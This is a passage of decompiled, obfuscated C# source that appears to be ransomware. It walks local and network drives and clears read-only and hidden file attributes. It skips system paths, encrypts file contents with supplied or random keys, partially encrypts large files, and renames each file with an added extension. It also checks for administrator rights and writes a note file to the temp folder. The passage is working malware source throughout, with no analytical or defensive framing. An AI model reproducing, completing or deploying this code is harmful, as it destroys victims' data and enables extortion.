		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void bncyMjJFXOqmi(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398601) + string_0 + getString_0(107398560) + ex.Message + getString_0(107396683));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string kkttwGmMPePa()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107401556);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107397991);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107397982))) ? getString_0(107397996) : getString_0(107397973));
				break;
			case 0:
				text = getString_0(107397987);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107397954);
				break;
			case 4:
				text = getString_0(107397941);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107397923) : getString_0(107397964));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107397931) : getString_0(107397936)) : getString_0(107397909)) : getString_0(107397918));
				break;
			case 10:
				text = getString_0(107397926);
				break;
			}
		}
		if (text != getString_0(107401556))
		{
			text = getString_0(107397889) + text;
			if (oSVersion.ServicePack != getString_0(107401556))
			{
				text = text + getString_0(107399937) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string SdmyEwGScdUdp(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395276);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(iBDvjzxzEcC(getString_0(107395243)));
				streamWriter.WriteLine(getString_0(107396683));
				streamWriter.WriteLine(iBDvjzxzEcC(getString_0(107390513)));
				streamWriter.WriteLine(string_0);
				if (lHJbFcHZdNnC)
				{
					streamWriter.WriteLine(getString_0(107396683));
					streamWriter.WriteLine(iBDvjzxzEcC(getString_0(107390371)));
					streamWriter.WriteLine(orMQkbNvmzZPsHt.XWqsewBKiLfR());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !IflXfWBKZN)
				{
					File.AppendAllText(text, getString_0(107390338) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397876) + ex.Message + getString_0(107396683));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void ZvvQOSAxrvm(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		nmLGDsygJvrP.cfAeuBOBEL CS_0024_003C_003E8__locals0 = new nmLGDsygJvrP();
		CS_0024_003C_003E8__locals0.ebJNjDLXrhXbmH = string_1;
		CS_0024_003C_003E8__locals0.TsUefJDxWOuiS = string_2;
		CS_0024_003C_003E8__locals0.DTBKtELBieK = string_3;
		CS_0024_003C_003E8__locals0.BiToJaAkWyjSw = string_4;
		if (mvGCZjuzXBvoZJaB && !kkttwGmMPePa().Contains(getString_0(107397923)) && !kkttwGmMPePa().Contains(getString_0(107397819)))
		{
			RlFlVENJjRsWaC.phZusPOXzXCh();
		}
		dZNuvPCEnaSnNI = Convert.FromBase64String(CS_0024_003C_003E8__locals0.DTBKtELBieK);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395875))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = fghmVsWLwigdi(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !uneznyCLJqjxYvh.Contains(text))
							{
								uneznyCLJqjxYvh.Add(text);
							}
							else if (!uneznyCLJqjxYvh.Contains(array[i].Name))
							{
								uneznyCLJqjxYvh.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!uneznyCLJqjxYvh.Contains(array[i].Name))
							{
								uneznyCLJqjxYvh.Add(array[i].Name);
							}
						}
					}
					else if (!uneznyCLJqjxYvh.Contains(array[i].Name))
					{
						uneznyCLJqjxYvh.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!uneznyCLJqjxYvh.Contains(string_0[j]))
				{
					uneznyCLJqjxYvh.Add(string_0[j]);
				}
			}
		}
		if (uneznyCLJqjxYvh.Contains(iBDvjzxzEcC(getString_0(107397838))) && cOCKAOtbAbbLiQ == getString_0(107396852))
		{
			uneznyCLJqjxYvh.Remove(iBDvjzxzEcC(getString_0(107397838)));
		}
		Parallel.ForEach(uneznyCLJqjxYvh, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new nmLGDsygJvrP.cfAeuBOBEL();
			CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn = string_0;
			if (ZdPTJTivRQPn && !kkttwGmMPePa().Contains(nmLGDsygJvrP.getString_0(107397935)) && !kkttwGmMPePa().Contains(nmLGDsygJvrP.getString_0(107397831)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						zrnHsDHKDix(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (CYtyMsjHbrwM == nmLGDsygJvrP.getString_0(107396864))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					aBmTBQOumL(CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.ebJNjDLXrhXbmH, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.BiToJaAkWyjSw, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.TsUefJDxWOuiS, CS_0024_003C_003E8__locals0.MBRxLCUcDRcQHo.DTBKtELBieK);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				aBmTBQOumL(CS_0024_003C_003E8__locals0.VdTMxUweOcfiCauJn, CS_0024_003C_003E8__locals0.ebJNjDLXrhXbmH, CS_0024_003C_003E8__locals0.BiToJaAkWyjSw, CS_0024_003C_003E8__locals0.TsUefJDxWOuiS, CS_0024_003C_003E8__locals0.DTBKtELBieK);
			}
		});
	}

	public static void aBmTBQOumL(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107401556));
		List<string> list3 = list2;
		if (iFPTiHpTDRrR == getString_0(107397109))
		{
			if (MNFaJbAsZzAD == getString_0(107396852) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && QuwBdvGGQnzo(string_0))
			{
				otJICxhVdGGY otJICxhVdGGY = null;
				try
				{
					otJICxhVdGGY = new otJICxhVdGGY(string_0.Replace(getString_0(107396774), getString_0(107401556)));
				}
				catch
				{
					list = LDoRIkWeLaR(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					FMQDDnzeKou(otJICxhVdGGY.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = LDoRIkWeLaR(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = LDoRIkWeLaR(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = lfFHEFlmfCqW.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0453;
					}
				}
				if ((nEPIZtCfLkv == getString_0(107397109) && !item.EndsWith(text)) || fQuiHGzOTAlx.Contains(item))
				{
					continue;
				}
				if (FiFLjMAxemfbt == getString_0(107396852))
				{
					try
					{
						if (BpsCidXmje.XYkowLVgnLlObar(item))
						{
							BpsCidXmje.ZKDZsMJwTeH(item);
						}
					}
					catch
					{
					}
				}
				fQuiHGzOTAlx.Add(item);
				if (!kEshrQncftX.Contains(Path.GetDirectoryName(item)))
				{
					kEshrQncftX.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (eUAtnXtzwCVQtt == getString_0(107396852) && fileStream.Length > Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024 && !list3.Contains(text))
					{
						if (cGbDMszYvGe == getString_0(107396852))
						{
							foreach (string item2 in UaltDtqfmMVTAX)
							{
								if (item.ToLower().EndsWith(item2) && cGDFQVDbXvzo == getString_0(107396852))
								{
									if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402181), getString_0(107402144), getString_0(107402163), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && cGDFQVDbXvzo == getString_0(107397109))
								{
									try
									{
										orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402181), getString_0(107402144), getString_0(107402163), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = scvFMtYlVeb.hpGAnTLbaTEeN(item, Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024);
						byte[] dNBUuDIlXHcMv = scvFMtYlVeb.AIyOtGwWrXEZ(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						scvFMtYlVeb.mtRrTfokQWXkK(item, dNBUuDIlXHcMv);
						if (string_2 != getString_0(107397829))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107397829))
					{
						swgUqDqyLKB(item, item + string_2, dZNuvPCEnaSnNI);
					}
					else
					{
						swgUqDqyLKB(item, item + getString_0(107397792), dZNuvPCEnaSnNI);
					}
				}
				catch (Exception)
				{
				}
				IL_0453:;
			}
		}
	}

	public static void FMQDDnzeKou(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		dOYydSKoLzIp.lMWNgthKPX CS_0024_003C_003E8__locals0 = new dOYydSKoLzIp();
		CS_0024_003C_003E8__locals0.mBwKTyYUMnTK = list_0;
		CS_0024_003C_003E8__locals0.EonUYJCKfDwF = string_1;
		CS_0024_003C_003E8__locals0.qEiHtzqbfmL = string_2;
		CS_0024_003C_003E8__locals0.QsejQwxWKSqe = string_3;
		CS_0024_003C_003E8__locals0.mKFRqpeTOqw = new List<string> { getString_0(107401556) };
		if (nEPIZtCfLkv == getString_0(107397109))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.mBwKTyYUMnTK)
				{
					if (!item.Contains(dOYydSKoLzIp.getString_0(107401032)) && !item.Contains(dOYydSKoLzIp.getString_0(107401007)) && !item.Contains(dOYydSKoLzIp.getString_0(107400974)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400989)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400944)) && !item.Contains(dOYydSKoLzIp.getString_0(107400919)) && !item.Contains(dOYydSKoLzIp.getString_0(107400930)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400885)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400872)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400867)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400858)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107401321)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107401295)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107401306)) && !item.Contains(dOYydSKoLzIp.getString_0(107401281)) && !item.Contains(dOYydSKoLzIp.getString_0(107401232)) && !item.Contains(dOYydSKoLzIp.getString_0(107401247)) && !item.Contains(dOYydSKoLzIp.getString_0(107401198)) && !item.Contains(dOYydSKoLzIp.getString_0(107401213)) && !item.Contains(dOYydSKoLzIp.getString_0(107401164)) && !item.Contains(dOYydSKoLzIp.getString_0(107401179)) && !item.Contains(dOYydSKoLzIp.getString_0(107401130)) && !item.Contains(dOYydSKoLzIp.getString_0(107401149)) && !item.Contains(dOYydSKoLzIp.getString_0(107401096)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107401115)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400558)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400573)) && !item.ToLower().Contains(dOYydSKoLzIp.getString_0(107400524)) && !item.Contains(iBDvjzxzEcC(dOYydSKoLzIp.getString_0(107400539))) && !item.Contains(dOYydSKoLzIp.getString_0(107400514)) && !item.Contains(dOYydSKoLzIp.getString_0(107396757)) && !item.Contains(dOYydSKoLzIp.getString_0(107400469)) && !item.EndsWith(CS_0024_003C_003E8__locals0.EonUYJCKfDwF) && !item.EndsWith(dOYydSKoLzIp.getString_0(107400476)) && !item.EndsWith(dOYydSKoLzIp.getString_0(107400439)) && !item.EndsWith(dOYydSKoLzIp.getString_0(107400434)) && !item.EndsWith(dOYydSKoLzIp.getString_0(107400429)) && !item.Contains(dOYydSKoLzIp.getString_0(107400424)) && !item.Contains(COjZSLMnxffln) && !item.Contains(ndioqUCcjeEwRygxn) && !item.Contains(zSigBrcrKLvB))
					{
						if (CS_0024_003C_003E8__locals0.qEiHtzqbfmL.Length != 0)
						{
							string[] qEiHtzqbfmL2 = CS_0024_003C_003E8__locals0.qEiHtzqbfmL;
							int num2 = 0;
							while (num2 < qEiHtzqbfmL2.Length)
							{
								string value2 = qEiHtzqbfmL2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0e93;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.EonUYJCKfDwF))
							{
								goto IL_0e93;
							}
						}
						catch (Exception)
						{
							goto IL_0e93;
						}
						if (item.EndsWith(string_0) && !fQuiHGzOTAlx.Contains(item))
						{
							if (FiFLjMAxemfbt == dOYydSKoLzIp.getString_0(107396872))
							{
								try
								{
									if (BpsCidXmje.XYkowLVgnLlObar(item))
									{
										BpsCidXmje.ZKDZsMJwTeH(item);
									}
								}
								catch
								{
								}
							}
							fQuiHGzOTAlx.Add(item);
							if (!kEshrQncftX.Contains(Path.GetDirectoryName(item)))
							{
								kEshrQncftX.Add(Path.GetDirectoryName(item));
							}
							bncyMjJFXOqmi(item);
							try
							{
								new fqIueWgOQEK().uUMSRroBuQWna(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (RxwgNpmsCUXw)
										{
											Console.WriteLine(dOYydSKoLzIp.getString_0(107349528) + item + dOYydSKoLzIp.getString_0(107349451) + new FileInfo(item).Length + dOYydSKoLzIp.getString_0(107349430));
											Console.WriteLine(dOYydSKoLzIp.getString_0(107349421));
										}
									}
									catch
									{
									}
									pjARRmeFiHBjb(iBDvjzxzEcC(dOYydSKoLzIp.getString_0(107348836)), dOYydSKoLzIp.getString_0(107400340) + item + dOYydSKoLzIp.getString_0(107400340) + iBDvjzxzEcC(dOYydSKoLzIp.getString_0(107348779)) + dOYydSKoLzIp.getString_0(107400340) + Environment.UserName + dOYydSKoLzIp.getString_0(107400340) + iBDvjzxzEcC(dOYydSKoLzIp.getString_0(107348794)));
								}
							}
							catch (Exception ex18)
							{
								if (SBPYnaSzKyFP)
								{
									try
									{
										File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107398621) + item + dOYydSKoLzIp.getString_0(107348769) + ex18.Message + dOYydSKoLzIp.getString_0(107396703));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0716;
									}
									goto end_IL_0716_2;
									end_IL_0716:;
								}
								catch (Exception ex20)
								{
									if (SBPYnaSzKyFP)
									{
										try
										{
											File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107398621) + item + dOYydSKoLzIp.getString_0(107348656) + ex20.Message + dOYydSKoLzIp.getString_0(107396703));
										}
										catch (Exception)
										{
										}
									}
									PuPUesizAwkkz++;
									goto end_IL_0716_2;
								}
								if (!(eUAtnXtzwCVQtt == dOYydSKoLzIp.getString_0(107396872)) || new FileInfo(item).Length <= Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024 || CS_0024_003C_003E8__locals0.mKFRqpeTOqw.Contains(string_0))
								{
									if (lHJbFcHZdNnC)
									{
										CS_0024_003C_003E8__locals0.EonUYJCKfDwF = GrEoYlDdrrJcnWE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
									}
									string text5 = JNEDQxTiGyvPh.XoKGyJzEnHtiLD(32);
									string text6 = dOYydSKoLzIp.getString_0(107401576);
									text6 = (IflXfWBKZN ? JNEDQxTiGyvPh.QdOxughxMncJD() : dOYydSKoLzIp.getString_0(107401576));
									string s3 = PtmCzzxPcg.UDDTmPOlNfmsO(text5 + text6);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107397849))
									{
										if (!yNTMpjtZXpajKX)
										{
											if (!IflXfWBKZN)
											{
												uHCaJlttjzbyG(item, item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, dZNuvPCEnaSnNI);
											}
											else
											{
												uHCaJlttjzbyG(item, item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, Convert.FromBase64String(text5));
											}
										}
										else
										{
											try
											{
												if (!IflXfWBKZN)
												{
													eZxZiohcedVC(item, item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
												}
												else
												{
													eZxZiohcedVC(item, item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
												}
											}
											catch (Exception ex22)
											{
												if (SBPYnaSzKyFP)
												{
													try
													{
														File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107398621) + item + dOYydSKoLzIp.getString_0(107397803) + ex22.Message + dOYydSKoLzIp.getString_0(107396703));
													}
													catch (Exception)
													{
													}
												}
												PuPUesizAwkkz++;
												try
												{
													File.Move(item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_0716_2;
											}
										}
									}
									else if (!yNTMpjtZXpajKX)
									{
										if (!IflXfWBKZN)
										{
											uHCaJlttjzbyG(item, item + dOYydSKoLzIp.getString_0(107397812), dZNuvPCEnaSnNI);
										}
										else
										{
											uHCaJlttjzbyG(item, item + dOYydSKoLzIp.getString_0(107397812), Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!IflXfWBKZN)
											{
												eZxZiohcedVC(item, item, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
											}
											else
											{
												eZxZiohcedVC(item, item, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex25)
										{
											if (SBPYnaSzKyFP)
											{
												try
												{
													File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107398621) + item + dOYydSKoLzIp.getString_0(107397803) + ex25.Message + dOYydSKoLzIp.getString_0(107396703));
												}
												catch (Exception)
												{
												}
											}
											PuPUesizAwkkz++;
											goto end_IL_0716_2;
										}
									}
									if (IflXfWBKZN)
									{
										if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107397849))
										{
											HiuKKSnyYq(item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, bytes3);
										}
										else
										{
											HiuKKSnyYq(item, bytes3);
										}
									}
									goto IL_0e93;
								}
								CS_0024_003C_003E8__locals0 = new dOYydSKoLzIp.nnITftDnrHBk();
								CS_0024_003C_003E8__locals0.EqCJrbOGYCEo = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107397849))
									{
										if (lHJbFcHZdNnC)
										{
											CS_0024_003C_003E8__locals0.EonUYJCKfDwF = GrEoYlDdrrJcnWE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF);
									}
								}
								catch (Exception ex27)
								{
									if (SBPYnaSzKyFP)
									{
										try
										{
											File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107398621) + item + dOYydSKoLzIp.getString_0(107349107) + ex27.Message + dOYydSKoLzIp.getString_0(107396703));
										}
										catch (Exception)
										{
										}
									}
									PuPUesizAwkkz++;
									goto end_IL_0716_2;
								}
								CS_0024_003C_003E8__locals0.BmoNJexcODDCT = dOYydSKoLzIp.getString_0(107401576);
								if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107397849))
								{
									CS_0024_003C_003E8__locals0.BmoNJexcODDCT = item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
								}
								else
								{
									CS_0024_003C_003E8__locals0.BmoNJexcODDCT = item;
								}
								if (cGbDMszYvGe == dOYydSKoLzIp.getString_0(107396872))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in UaltDtqfmMVTAX)
										{
											if (CS_0024_003C_003E8__locals0.BmoNJexcODDCT.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == dOYydSKoLzIp.nnITftDnrHBk.getString_0(107396875))
											{
												if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BmoNJexcODDCT).Length)
												{
													try
													{
														orMQkbNvmzZPsHt.pBYlYRXdmUuSS(dOYydSKoLzIp.nnITftDnrHBk.getString_0(107402204), dOYydSKoLzIp.nnITftDnrHBk.getString_0(107402167), dOYydSKoLzIp.nnITftDnrHBk.getString_0(107402186), CS_0024_003C_003E8__locals0.BmoNJexcODDCT);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.BmoNJexcODDCT.ToLower().EndsWith(item2) && cGDFQVDbXvzo == dOYydSKoLzIp.nnITftDnrHBk.getString_0(107397132))
											{
												try
												{
													orMQkbNvmzZPsHt.pBYlYRXdmUuSS(dOYydSKoLzIp.nnITftDnrHBk.getString_0(107402204), dOYydSKoLzIp.nnITftDnrHBk.getString_0(107402167), dOYydSKoLzIp.nnITftDnrHBk.getString_0(107402186), CS_0024_003C_003E8__locals0.BmoNJexcODDCT);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text7 = JNEDQxTiGyvPh.XoKGyJzEnHtiLD(32);
								string text8 = dOYydSKoLzIp.getString_0(107401576);
								text8 = (IflXfWBKZN ? JNEDQxTiGyvPh.QdOxughxMncJD() : dOYydSKoLzIp.getString_0(107401576));
								string s4 = PtmCzzxPcg.UDDTmPOlNfmsO(text7 + text8);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (PurCmZibxBamv == dOYydSKoLzIp.getString_0(107397129))
								{
									byte[] array2 = null;
									byte[] byte_2 = scvFMtYlVeb.hpGAnTLbaTEeN(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024);
									if (scvFMtYlVeb.mtRrTfokQWXkK(DNBUuDIlXHcMv: (!FmiPpRhQSBxQ) ? (IflXfWBKZN ? scvFMtYlVeb.AIyOtGwWrXEZ(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : scvFMtYlVeb.AIyOtGwWrXEZ(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.QsejQwxWKSqe), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IflXfWBKZN ? CiqamKuyrt.uZhbCYxeOxuMJx(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : CiqamKuyrt.uZhbCYxeOxuMJx(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.QsejQwxWKSqe), Convert.FromBase64String(eUUqvSerqkEdI))), MLqpVyadMeGdgmK: CS_0024_003C_003E8__locals0.BmoNJexcODDCT, kRGGWEuoppgYu: bytes4))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!IflXfWBKZN)
								{
									if (QfVKvNIzyJTRTFb.nPDNQoqIpmrky(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, XLyVBayizjzN, CS_0024_003C_003E8__locals0.QsejQwxWKSqe, null, Convert.FromBase64String(eUUqvSerqkEdI)))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (QfVKvNIzyJTRTFb.nPDNQoqIpmrky(CS_0024_003C_003E8__locals0.BmoNJexcODDCT, XLyVBayizjzN, text7, bytes4, Convert.FromBase64String(text8)))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_0716_2:;
							}
							catch (Exception)
							{
								goto IL_0e93;
							}
						}
					}
					continue;
					IL_0e93:
					CS_0024_003C_003E8__locals0.mBwKTyYUMnTK.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.mBwKTyYUMnTK, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new dOYydSKoLzIp.lMWNgthKPX();
			CS_0024_003C_003E8__locals0.EqCJrbOGYCEo = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.hGfHXtUEXE = string_0;
			if (!CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401032)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401007)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400974)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400989)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400944)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400919)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400930)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400885)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400872)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400867)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400858)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107401321)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107401295)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107401306)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401281)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401232)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401247)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401198)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401213)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401164)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401179)) && 